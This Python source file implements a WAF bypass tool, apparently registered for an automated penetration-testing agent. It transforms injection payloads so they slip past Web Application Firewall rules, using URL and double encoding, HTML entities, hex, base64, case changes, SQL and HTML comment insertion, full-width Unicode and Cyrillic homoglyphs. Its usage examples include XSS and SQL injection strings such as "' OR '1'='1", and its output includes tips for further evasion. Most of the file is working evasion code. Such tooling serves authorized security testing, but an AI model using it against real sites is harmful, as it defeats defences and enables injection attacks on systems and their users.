"""WAF Bypass Toolkit for evading Web Application Firewall rules."""

from __future__ import annotations

import base64
import urllib.parse
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


WAFBypassAction = Literal[
    "encode_payload",
    "generate_variants",
    "case_manipulation",
    "comment_injection",
    "unicode_bypass",
]


def _url_encode(payload: str, double: bool = False) -> str:
    """URL encode payload."""
    encoded = urllib.parse.quote(payload, safe="")
    if double:
        encoded = urllib.parse.quote(encoded, safe="")
    return encoded


def _case_variations(payload: str) -> list[str]:
    """Generate case variations of payload."""
    variations = [
        payload.upper(),
        payload.lower(),
        payload.capitalize(),
        "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
    ]
    return variations


def _comment_injection_variants(payload: str) -> list[str]:
    """Generate comment-injected variants."""
    # SQL comment injection
    sql_variants = [
        payload.replace(" ", "/**/"),
        payload.replace(" ", "/*comment*/"),
        payload.replace("'", "'/**/"),
        payload.replace("=", "=/**/"),
    ]

    # HTML comment injection
    html_variants = [
        payload.replace("<", "<<!--"),
        payload.replace(">", "-->"),
    ]

    return sql_variants + html_variants


def _unicode_variants(payload: str) -> list[str]:
    """Generate Unicode variants."""
    variants = []

    # Full-width characters
    fullwidth = ""
    for char in payload:
        if "a" <= char <= "z":
            fullwidth += chr(ord(char) - ord("a") + 0xFF41)
        elif "A" <= char <= "Z":
            fullwidth += chr(ord(char) - ord("A") + 0xFF21)
        elif "0" <= char <= "9":
            fullwidth += chr(ord(char) - ord("0") + 0xFF10)
        else:
            fullwidth += char
    variants.append(fullwidth)

    # Unicode escape
    unicode_escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
    variants.append(unicode_escaped)

    return variants


@register_tool
def waf_bypass_toolkit(
    action: WAFBypassAction,
    payload: str | None = None,
    encoding_type: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """WAF Bypass Toolkit for evading Web Application Firewall detection.

    Generates various payload encodings and transformations to bypass
    WAF rules including URL encoding, case manipulation, comment injection,
    and Unicode normalization.

    Args:
        action: The bypass technique:
            - encode_payload: Encode payload with various methods
            - generate_variants: Generate multiple payload variants
            - case_manipulation: Generate case variations
            - comment_injection: Inject comments to evade detection
            - unicode_bypass: Generate Unicode-based bypasses
        payload: Original payload to transform
        encoding_type: Specific encoding (url, double_url, hex, base64)

    Returns:
        Transformed payloads for WAF bypass testing
    """
    # Define valid parameters and actions
    VALID_PARAMS = {
        "action",
        "payload",
        "encoding_type",
    }
    VALID_ACTIONS = [
        "encode_payload",
        "generate_variants",
        "case_manipulation",
        "comment_injection",
        "unicode_bypass",
    ]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "waf_bypass_toolkit")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint("waf_bypass_toolkit", "encode_payload", {"payload": "<script>alert(1)</script>"})
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "waf_bypass_toolkit")
    if action_error:
        action_error["usage_examples"] = {
            "encode_payload": "waf_bypass_toolkit(action='encode_payload', payload='<script>alert(1)</script>')",
            "generate_variants": "waf_bypass_toolkit(action='generate_variants', payload=\"' OR '1'='1\")",
            "case_manipulation": "waf_bypass_toolkit(action='case_manipulation', payload='SELECT')",
            "comment_injection": "waf_bypass_toolkit(action='comment_injection', payload='SELECT * FROM users')",
            "unicode_bypass": "waf_bypass_toolkit(action='unicode_bypass', payload='<script>alert(1)</script>')",
        }
        return action_error

    # Validate required parameters for most actions
    if action not in ["generate_variants"]:
        param_error = validate_required_param(payload, "payload", action, "waf_bypass_toolkit")
        if param_error:
            param_error.update(
                generate_usage_hint("waf_bypass_toolkit", action, {"payload": "<script>alert(1)</script>"})
            )
            return param_error

    try:
        if not payload and action != "generate_variants":
            return {"error": "payload required for this action"}

        if action == "encode_payload":
            original = payload or ""

            encodings = {
                "original": original,
                "url_encoded": _url_encode(original),
                "double_url_encoded": _url_encode(original, double=True),
                "html_entities": "".join(f"&#{ord(c)};" for c in original),
                "hex_encoded": "".join(f"\\x{ord(c):02x}" for c in original),
                "unicode_escaped": "".join(f"\\u{ord(c):04x}" for c in original),
                "base64": base64.b64encode(original.encode()).decode(),
            }

            return {
                "original_payload": original,
                "encodings": encodings,
                "recommendations": [
                    "Try each encoding separately",
                    "Combine multiple encodings (e.g., URL + HTML entities)",
                    "Test partial encoding (encode only suspicious parts)",
                    "Check if WAF decodes in different order than application",
                ],
            }

        if action == "generate_variants":
            base_payloads = payload or "' OR '1'='1"

            variants = {
                "original": base_payloads,
                "case_variants": _case_variations(base_payloads),
                "comment_injected": _comment_injection_variants(base_payloads),
                "unicode_variants": _unicode_variants(base_payloads),
                "whitespace_variants": [
                    base_payloads.replace(" ", "\t"),
                    base_payloads.replace(" ", "\n"),
                    base_payloads.replace(" ", "\r\n"),
                    base_payloads.replace(" ", "/**/"),
                ],
            }

            all_variants = []
            for category, var_list in variants.items():
                if isinstance(var_list, list):
                    all_variants.extend(var_list)
                else:
                    all_variants.append(var_list)

            return {
                "original_payload": base_payloads,
                "total_variants": len(all_variants),
                "variants_by_type": variants,
                "all_variants": all_variants,
            }

        if action == "case_manipulation":
            original = payload or ""

            return {
                "original": original,
                "variations": {
                    "upper": original.upper(),
                    "lower": original.lower(),
                    "title": original.title(),
                    "alternating": "".join(
                        c.upper() if i % 2 else c.lower() for i, c in enumerate(original)
                    ),
                    "random_case": "".join(
                        c.upper() if hash(c + str(i)) % 2 else c.lower()
                        for i, c in enumerate(original)
                    ),
                },
                "sql_examples": {
                    "select": ["SELECT", "select", "SeLeCt", "sElEcT"],
                    "union": ["UNION", "union", "UnIoN", "uNiOn"],
                    "or": ["OR", "or", "Or", "oR"],
                },
            }

        if action == "comment_injection":
            original = payload or ""

            sql_variants = {
                "inline_comments": [
                    original.replace(" ", "/**/"),
                    original.replace(" ", "/*comment*/"),
                    original.replace("'", "'/**/"),
                ],
                "line_comments": [
                    original + "--",
                    original + "-- ",
                    original + "#",
                ],
                "nested_comments": [
                    original.replace(" ", "/*/**/*/"),
                ],
            }

            xss_variants = {
                "html_comments": [
                    original.replace("<", "<<!--"),
                    original.replace(">", "-->"),
                ],
                "js_comments": [
                    original.replace("<script>", "<script>/**/"),
                    original.replace("</script>", "//</script>"),
                ],
            }

            return {
                "original": original,
                "sql_injection_bypasses": sql_variants,
                "xss_bypasses": xss_variants,
                "usage": "Comments can break signature-based WAF detection",
            }

        if action == "unicode_bypass":
            original = payload or ""

            return {
                "original": original,
                "unicode_variants": {
                    "fullwidth": _unicode_variants(original)[0],
                    "unicode_escape": _unicode_variants(original)[1],
                    "overlong_utf8": "Requires binary manipulation",
                    "homoglyphs": {
                        "a": "а",  # Cyrillic 'a'
                        "e": "е",  # Cyrillic 'e'
                        "o": "о",  # Cyrillic 'o'
                        "p": "р",  # Cyrillic 'p'
                        "c": "с",  # Cyrillic 'c'
                    },
                },
                "normalization_attacks": {
                    "description": "Unicode normalization can bypass filters",
                    "example": "＜script＞ (fullwidth) -> <script> (after normalization)",
                },
            }

        return {"error": f"Unknown action: {action}"}

    except (ValueError, UnicodeError) as e:
        return {"error": f"WAF bypass operation failed: {e!s}"}
